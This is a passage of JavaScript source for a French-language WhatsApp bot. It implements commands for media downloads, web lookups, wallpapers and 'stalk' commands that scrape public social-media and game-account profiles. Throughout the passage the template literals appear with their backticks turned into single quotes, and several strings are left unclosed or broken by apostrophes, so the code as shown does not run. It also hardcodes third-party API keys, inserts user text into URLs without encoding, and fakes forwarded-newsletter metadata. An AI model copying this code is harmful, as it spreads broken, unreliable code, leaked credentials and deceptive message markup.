    }
    // Choose between 1 and 5 videos at random
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];
    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Avoid selecting the same videos
      selectedVideos.push(randomVideo);
    }
    let push = [];
    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = 'Titre : ${video.title}';
      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: Kev.waUploadToServer });
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: 'Video ${i + 1}',
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "cta_copy",
              "buttonParamsJson": '{"display_text":"Copy Url","id":"1234","copy_code":"${video.url}"}'
            }
          ]
        })
      });
    }
    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ownername
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            }),
            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
          })
        }
      }
    }, {quoted:m});
    await Kev.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await replygckev('Erreur');
  }
}
break
            case 'play':  case 'song': {
if (!text) return replygckev('Exemple : ${prefix + command} opening one piece 25')
const kevplaymp3 = require('./bibliotheque/ytdl')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await kevplaymp3.mp3(anup3k.url)
await Kev.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            sourceUrl: websitex,
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case 'ytmp3': case 'ytaudio':
let kevaudp3 = require('./bibliotheque/ytdl')
if (args.length < 1 || !isUrl(text) || !kevaudp3.isYTUrl(text)) return replygckev('Veuillez entrer le lien\nExemple: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share')
let audio = await kevaudp3.mp3(text)
await Kev.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const kevvidoh = require('./bibliotheque/ytdl')
if (args.length < 1 || !isUrl(text) || !kevvidoh.isYTUrl(text)) replygckev('Veuillez entrer le lien\n\nExemple : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps')
const vid=await kevvidoh.mp4(text)
const ytc='
*${themeemoji}Titre:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duree:* ${vid.duration}
*${themeemoji}Qualitey:* ${vid.quality}'
await Kev.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'git': case 'gitclone':
if (!args[0]) return replygckev('Veuillez entrer le lien\nExemple :\n${prefix}${command} https://github.com/kenvofc/SYLVERSMD')
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygckev('Lien invalid!!')
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = 'https://api.github.com/repos/${user}/${repo}/zipball'
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Kev.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygckev(mess.error))
break
case'tiktok':{
if (!text) return replygckev('Veuillez l.utiliser comme telle : ${prefix+command} *query*\n\n_Exemple_\n\n${prefix+command} khaby lame')
Kev.sendMessage(m.chat, { react: { text: '⏱️', key: m.key }})
try{
let anu = await fetchJson('https://api.junn4.my.id/search/tiktoksearch?query=${text}')
const capt = anu.result.title
await Kev.sendMessage(m.chat, { video: { url: anu.result.no_watermark}, caption: '🔖TITRE : ${capt}'}, {quoted: m})
await Kev.sendMessage(m.chat, { react: { text: '☑️', key: m.key }})
}catch (error) {
replygckev('Sorry cette video ne peut �tre telechargee\n\nRequete failed with status code *400*');
}
}
break
case 'tiktok_video':
case 'tiktokmp4': {
if (!q) return replygckev( 'Exemple : ${prefix + command} lien')
if (!q.includes('tiktok')) return replygckev('Lien Invalide!!')
require('./bibliotheque/tiktok').Tiktok(q).then( data => {
Kev.sendMessage(m.chat, { caption: 'We the best !', video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktok_mp3':
case 'tiktok_audio':{
if (!q) return replygckev( 'Exemple : ${prefix + command} lien')
if (!q.includes('tiktok')) return replygckev('Lien Invalide!!')
require('./bibliotheque/tiktok').Tiktok(q).then( data => {
const kevtikmp3 = {url:data.audio}
Kev.sendMessage(m.chat, { audio: kevtikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
})
}
break
case'ttslide': case 'tiktok_slide':{
if (!text) return replygckev('Veuillez l'utiliser comme tel ${prefix+command} *url*\n\n_Exemple_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/')
Kev.sendMessage(m.chat, { react: { text: '⏱️', key: m.key }})
try{
let anu = await fetchJson('https://aemt.me/download/tiktokslide?url=${text}')
await Kev.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ''}, {quoted: m})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await Kev.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'google': {
if (!q) return replygckev('Exemple : ${prefix + command} ${botname}')
await KevStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = 'Recherche Google de : ${text}\n\n'
for (let g of res) {
teks += '⭔ *Titre* : ${g.title}\n'
teks += '⭔ *Description* : ${g.snippet}\n'
teks += '⭔ *Lien* : ${g.link}\n\n────────────────────────\n\n'
} 
replygckev(teks)
})
}
break
case 'meteo':{
if (!text) return replygckev('Veuillez entrer une zone geographique')
            let wdata = await axios.get(
                'https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=fr'
            );
            let textw = ""
            textw += '*🗺️Meteo de  ${text}*\n\n'
            textw += '*Meteo:-* ${wdata.data.weather[0].main}\n'
            textw += '*Description:-* ${wdata.data.weather[0].description}\n'
            textw += '*Temps:-* ${wdata.data.main.temp}\n'
            textw += '*Feels Like:-* ${wdata.data.main.feels_like}\n'
            textw += '*Pression:-* ${wdata.data.main.pressure}\n'
            textw += '*Humiditey:-* ${wdata.data.main.humidity}\n'
            textw += '*Humiditey:-* ${wdata.data.wind.speed}\n'
            textw += '*Latitude:-* ${wdata.data.coord.lat}\n'
            textw += '*Longitude:-* ${wdata.data.coord.lon}\n'
            textw += '*Pays:-* ${wdata.data.sys.country}\n'

           Kev.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'facebook2': case 'fb2':{
if (!text) return replygckev('Veuillez entrer le lien!!!')
if (!isUrl(args[0])) return replygckev('Ou est le lien?')
await Kev.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
try{
let anu = await fetchJson('https://aemt.me/download/fbdown?url=${text}')
Kev.sendMessage(m.chat, { video: { url: anu.result.url.urls[0].hd }, caption: 'We the best!' }, { quoted: m })
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await Kev.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
           case 'fb':
           case 'facebook':
case 'facebookvid': {
           if (!args[0]) {
    return replygckev('Veuillez entrerle lien d'une video Facebook\n\nEXEMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz')
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replygckev('Url invalide')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = '
        [ FACEBOOK  ]
${themeemoji} Titre: ${result.title}';
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    Kev.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replygckev('il se pourrait qu.il s.agisse d.une video privee!')
  }
  }
  break
case 'tiktok_stalk': {
	  if (!text) return replygckev('Veuillez entrer le nom d.utilisateur ')
  let res = await fg.ttStalk(args[0])
  let txt = '
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Numero:* ${res.name}
▢ *🔖Utilisateur:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Lien* : https://tiktok.com/${res.username}
└────────────'
  await Kev.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
case 'xxxig_stalk': {
if (!text) return replygckev('Veuillez entrer le nom d'utilisateur\n\nExemple: ${prefix + command} kenv8070')
    let res = await fg.igStalk(text)
    let te = '
┌──「 *STALKING* 
▢ *🔖Nom:* ${res.name} 
▢ *🔖Utilisateur:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Postes:* ${res.postsH}
▢ *🔗 Lien* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────'
     await Kev.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
}
break
case 'ghstalk': case 'github_stalk':{
if (!q) return replygckev('Exemple ${prefix+command} kenvofc')
await KevStickWait()
let githubstalk = require('./bibliotheque/scraper')
aj = await githubstalk.githubstalk('${q}')
Kev.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
'*/ Github Stalker \\*

Utilisateur : ${aj.username}
Pseudo : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Localisation : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}' }, { quoted: m } )
}
break
case 'npm_stalk':{
if (!q) return replygckev('Exemple ${prefix+command} kenvapi')
await KevStickWait()
let npmstalk = require('./bibliotheque/scraper')
eha = await npmstalk.npmstalk(q)
replygckev('*/ Npm Stalker \\*

Nom : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}')
}
break
case 'freefire_stalk':{
if (!q) return replygckev('Exemple ${prefix+command} 946716486')
await KevStickWait()
let ffstalk = require('./bibliotheque/scraper')
eeh = await ffstalk.ffstalk('${q}')
replygckev('*/ Free Fire Stalker \\*

Id : ${eeh.id}
Pseudo : ${eeh.nickname}')
}
break
case 'mobilelegend_stalk': {
if (!q) return replygckev('Exemple ${prefix+command} 530793138|8129')
await KevStickWait()
let mlstalk = require('./bibliotheque/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygckev('*/ Mobile Legend Stalker \\*

Utilisateur : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}')
}
break
case 'spotify':{
	if (!text) return replygckev('*Veuillez entrer le titre de la chanson*')
    try {
        const apiUrl = 'https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}'
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return replygckev('Erreur)
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = 'https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}'
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return replygckev('Erreur')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return replygckev( 'Erreur')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "kenvofc",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                titre: 'PLAYING TO ${name}',
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await Kev.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return replygckev('*Erreur*')
    }
    }
    break
case 'imdb':
if (!text) return replygckev('_Veuillez entrer le nom du film ou de la serie')
await KevStickWait()
            let fids = await axios.get('http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full')
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ''' IMDB SEARCH'''\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           Kev.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'ebinaire': {
if (!q) return replygckev('Veuillez repondre a un text ${prefix + command}')
let { eBinary } = require('./bibliotheque/binaire')
let eb = await eBinary('${q}')
replygckev(eb)
}
break
case 'dbinaire': {
if (!q) return replygckev('Veuilez repondre a un message ${prefix + command}')
let { dBinary } = require('./bibliotheque/binaire')
let db = await dBinary('${q}')
replygckev(db)
}
break
case 'happymod':{
if (!q) return replygckev('Exemple ${prefix+command} GTA V mod')
await KevStickWait()
let kat = await scp2.happymod(q)
replygckev(util.format(kat))
}
break
case 'google_drive': {
		if (!args[0]) return replygckev('Veuillez entrer un lien Google Drive')
	await KevStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygckev('
≡ *Google Drive*
▢ *Nom:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}')
	Kev.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygckev('Erreur: veuillez verifier votrer lien ou essayez en un autre') 
  }
}
break
case 'pinterest': case 'pin': {
  if (!text) return replygckev('Veuillez entrer le titre');
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: Kev.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get('https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559');
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Randomize arrays
  let ult = res.splice(0, 5); // Takes the first 10 images from a randomized array
  let i = 1;
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: '_*Voici le resultat de : ${text}*_'
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: botname
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        titre: 'Image - ${i++}',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": '{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}'
          }
        ]
      })
    });
  }
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});
  await Kev.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break
case 'pinterest2': {
if (!text) return replygckev('Usage ${prefix+ command} one piece')
    const { googleImage } = require('@bochilteam/scraper')
    const anutrest = await googleImage(text)
    let image = anutrest[Math.floor(Math.random() * anutrest.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\n_*Voici le resultat de: ${text}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: image } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command} ${text}\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'ringtone': {
		if (!text) return replygckev('Exemple : ${prefix + command} black rover')
        let { ringtone }= require('./bibliotheque/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		Kev.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'couplepp': case 'pp_couple': {
let anu = require('./recherche/media/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
Kev.sendMessage(from, { image: { url: random.male }, caption: 'Couple pp pour mec' }, { quoted: m })
Kev.sendMessage(from, { image: { url: random.female }, caption: 'Couple pp pour meuf' }, { quoted: m })
}
break
case 'pp':  case 'profilepicture':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}
_*Voici le resultat de: ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "reponse_rapide",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'wallml': case 'wallpaperml':case 'mobile_legend':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}
_*Voici le resultat de: ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'wallpaper_phone': case 'wallphone':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}
_*Voici le resultat de: ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
            case 'remini': {
			if (!quoted) return replygckev('Veuillez repondre a une image ?')
			if (!/image/.test(mime)) return replygckev('Veuillez repondre a une photo ${prefix + command}')
			await KevStickWait()
			const { remini } = require('./bibliotheque/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}
_*Voici le resultat de: ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: proses }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😍\",\"id\":\""}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
			}
			break
			case 'definir': 
if (!q) return replygckev('Que voulez-vous definir?')
try {
targetfine = await axios.get('http://api.urbandictionary.com/v0/define?term=${q}')
if (!targetfine) return replygckev(mess.error)
const reply = '
*${themeemoji} Mot:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Exemple:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}'
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: reply
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🧐\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
} catch (err) {
    console.log(err)
    return replygckev('*${q}* isn't a valid text')
    }
    break
                case 'puis_je': {
            	if (!text) return replygckev('Veuillez poser une question\n\nExemple : ${prefix + command} t'embrasser?')
            	let bisa = ['Oui tu peux','Bien evidemment','Biensur','Non tu ne peux pas!!!','Je ne sais pas','Ce genre de question n'entre pas dans le registe de mes competences','Tu peux toujours demander a ta mere','Ecris fort je n.entend pas','j.ai besoin de quelques jours pour reflechir','fais 7-3 ou 4 tu auras la reponse','Demande a google','Je peux plutot te parler d.un sujet interessant. as-tu deja entendu parler de Jesus Christ?','Je suis trop beau pour te repondre', 'Patiente quelques secondes et repose ta question']
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = '*Puis-je ${text}*\nReponse : ${keh}'
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
